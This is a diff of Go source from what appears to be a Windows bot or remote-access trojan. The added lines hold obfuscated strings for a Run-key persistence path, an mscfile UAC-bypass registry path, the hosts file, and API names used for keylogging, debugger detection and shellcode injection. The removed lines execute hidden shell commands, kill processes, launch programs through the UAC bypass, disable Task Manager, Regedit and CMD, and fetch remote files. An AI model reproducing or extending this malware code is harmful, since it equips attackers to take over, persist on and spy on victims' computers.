@@ -2,20 +2,130 @@ package components
 
 import (
 	"bytes"
-	"encoding/base64"
 	"fmt"
-	"io"
 	"math/rand"
-	"net/http"
-	"os"
-	"os/exec"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 
 	"github.com/StackExchange/wmi"
-	"golang.org/x/sys/windows/registry"
+)
+
+type mMind struct {
+	City struct {
+		GeonameID int `json:"geoname_id"`
+		Names     struct {
+			En string `json:"en"`
+			Ru string `json:"ru"`
+		} `json:"names"`
+	} `json:"city"`
+	Continent struct {
+		Code      string `json:"code"`
+		GeonameID int    `json:"geoname_id"`
+		Names     struct {
+			Ja   string `json:"ja"`
+			PtBR string `json:"pt-BR"`
+			Ru   string `json:"ru"`
+			ZhCN string `json:"zh-CN"`
+			De   string `json:"de"`
+			En   string `json:"en"`
+			Es   string `json:"es"`
+			Fr   string `json:"fr"`
+		} `json:"names"`
+	} `json:"continent"`
+	Country struct {
+		IsoCode   string `json:"iso_code"`
+		GeonameID int    `json:"geoname_id"`
+		Names     struct {
+			ZhCN string `json:"zh-CN"`
+			De   string `json:"de"`
+			En   string `json:"en"`
+			Es   string `json:"es"`
+			Fr   string `json:"fr"`
+			Ja   string `json:"ja"`
+			PtBR string `json:"pt-BR"`
+			Ru   string `json:"ru"`
+		} `json:"names"`
+	} `json:"country"`
+	Location struct {
+		AccuracyRadius int     `json:"accuracy_radius"`
+		Latitude       float64 `json:"latitude"`
+		Longitude      float64 `json:"longitude"`
+		MetroCode      int     `json:"metro_code"`
+		TimeZone       string  `json:"time_zone"`
+	} `json:"location"`
+	Postal struct {
+		Code string `json:"code"`
+	} `json:"postal"`
+	Subdivisions []struct {
+		IsoCode   string `json:"iso_code"`
+		GeonameID int    `json:"geoname_id"`
+		Names     struct {
+			En   string `json:"en"`
+			Es   string `json:"es"`
+			Fr   string `json:"fr"`
+			Ja   string `json:"ja"`
+			PtBR string `json:"pt-BR"`
+			Ru   string `json:"ru"`
+			ZhCN string `json:"zh-CN"`
+			De   string `json:"de"`
+		} `json:"names"`
+	} `json:"subdivisions"`
+	Traits struct {
+		AutonomousSystemNumber       int    `json:"autonomous_system_number"`
+		AutonomousSystemOrganization string `json:"autonomous_system_organization"`
+		Isp                          string `json:"isp"`
+		Organization                 string `json:"organization"`
+		IPAddress                    string `json:"ip_address"`
+	} `json:"traits"`
+}
+
+type win32Process struct {
+	Name           string
+	ExecutablePath *string
+}
+
+type win32Product struct {
+	Name *string
+}
+
+var (
+	//============================================================
+	//                   Dont Touch Bellow
+	//============================================================
+
+	runPath            = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo")             //Software\Microsoft\Windows\CurrentVersion\Run
+	homepagePath       = deobfuscate("Tpguxbsf]]Njdsptpgu]]Joufsofu!Fyqmpsfs]]Nbjo")              //Software\Microsoft\Internet Explorer\Main
+	systemPoliciesPath = deobfuscate("Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Qpmjdjft]Tztufn") //Software\Microsoft\Windows\CurrentVersion\Policies\System
+
+	bypassPath    = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf]]tifmm]]pqfo]]dpnnboe") //HKCU\Software\Classes\mscfile\shell\open\command
+	bypassPathAlt = deobfuscate("ILDV]]Tpguxbsf]]Dmbttft]]ntdgjmf")                       //HKCU\Software\Classes\mscfile
+
+	hostFilePath = deobfuscate("Tztufn43]]esjwfst]]fud]]") //system32/drivers/etc/
+
+	user32   = syscall.NewLazyDLL(deobfuscate("vtfs43/emm"))   //user32.dll
+	kernel32 = syscall.NewLazyDLL(deobfuscate("lfsofm43/emm")) //kernel32.dll
+
+	procMessageBoxW = user32.NewProc(deobfuscate("NfttbhfCpyX")) //MessageBoxW
+
+	procGetAsyncKeyState = user32.NewProc(deobfuscate("HfuBtzodLfzTubuf")) //GetAsyncKeyState
+
+	procCreateMutex = kernel32.NewProc(deobfuscate("DsfbufNvufyX")) //CreateMutexW
+
+	procIsDebuggerPresent = kernel32.NewProc(deobfuscate("JtEfcvhhfsQsftfou")) //IsDebuggerPresent
+
+	procGetForegroundWindow = user32.NewProc(deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
+	procGetWindowTextW      = user32.NewProc(deobfuscate("HfuXjoepxUfyuX"))      //GetWindowTextW
+	procShowWindow          = user32.NewProc(deobfuscate("TipxXjoepx"))          //ShowWindow
+	procEnumWindows         = user32.NewProc(deobfuscate("FovnXjoepxt"))         //EnumWindows
+
+	procSystemParametersInfoW = user32.NewProc(deobfuscate("TztufnQbsbnfufstJogpX")) //SystemParametersInfoW
+
+	procVirtualAlloc        = kernel32.NewProc(deobfuscate("WjsuvbmBmmpd"))        //VirtualAlloc
+	procRtlMoveMemory       = kernel32.NewProc(deobfuscate("SumNpwfNfnpsz"))       //RtlMoveMemory
+	procCreateThread        = kernel32.NewProc(deobfuscate("DsfbufUisfbe"))        //CreateThread
+	procWaitForSingleObject = kernel32.NewProc(deobfuscate("XbjuGpsTjohmfPckfdu")) //WaitForSingleObject
 )
 
 func newDebugUpdate(message string) {
@@ -146,99 +256,4 @@ func goToSleep(sleeptime int) { //Makes the bot sleep
 
 func takeAMoment() {
 	time.Sleep(time.Duration(randInt(250, 500)) * time.Millisecond)
-}
-
-func openURL(URL string, mode string) { //Opens a URL
-	if mode == "0" {
-		rsp, err := http.Get(URL)
-		if err != nil {
-		}
-		defer rsp.Body.Close()
-	} else { //visable
-		exec.Command("cmd", "/c", "start", URL).Start()
-	}
-}
-
-func startEXE(name string, uac string) { //Start an exe; example calc
-	if strings.Contains(name, ".exe") {
-		if uac == "0" {
-			binary, _ := exec.LookPath(name)
-			exec.Command(binary).Run()
-		} else {
-			binary, _ := exec.LookPath(name)
-			uacBypass(binary)
-		}
-	}
-}
-func powerOptions(mode string) {
-	if mode == "0" {
-		run("shutdown -s -t 00")
-	} else if mode == "1" {
-		run("shutdown -r -t 00")
-	} else if mode == "2" {
-		run("shutdown -l -t 00")
-	}
-}
-
-func registryToy(val string, opt int) {
-	if opt == 0 { //TaskMngr
-		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", val) //0 = on|1 = off
-	} else if opt == 1 { //Regedit
-		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", val) //0 = on|1 = off
-	} else if opt == 2 { //CMD
-		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", val) //0 = on|1 = off
-	} else if opt == 3 { //Bot ReMaster
-		_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER")                //Delete old
-		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER", obfuscate(val)) //Write new
-	} else if opt == 4 { //Change Last known command
-		//_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")              //Delete old
-		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST", md5Hash(val)) //Write new
-
-	}
-}
-
-func setBackground(mode string, data string) {
-	if mode == "0" { //http.GET
-		n := randomString(5, false)
-		output, err := os.Create(tmpPath + n + ".jpg")
-		defer output.Close()
-		response, _ := http.Get(data)
-		if err != nil {
-		}
-		defer response.Body.Close()
-		_, err = io.Copy(output, response.Body)
-		if err == nil {
-			ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
-			if ret == 1 {
-			}
-		}
-	} else { //Base64
-		n := randomString(5, false)
-		Image, _ := os.Create(tmpPath + n + ".jpg")
-		DecodedImage, _ := base64.StdEncoding.DecodeString(data)
-		Image.WriteString(string(DecodedImage))
-		Image.Close()
-		ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
-		if ret == 1 {
-		}
-	}
-}
-func setHomepage(url string) {
-	_ = writeRegistryKey(registry.CURRENT_USER, homepagePath, "Start Page", url)
-}
-
-func run(cmd string) {
-	c := exec.Command("cmd", "/C", cmd)
-	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	if err := c.Run(); err != nil {
-		newDebugUpdate("Run: " + err.Error())
-	}
-}
-
-func kill(name string) { //Kill("Tool.exe")
-	c := exec.Command("cmd", "/C", "taskkill /F /IM "+name)
-	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	if err := c.Run(); err != nil {
-		newDebugUpdate("Kill: " + err.Error())
-	}
 }
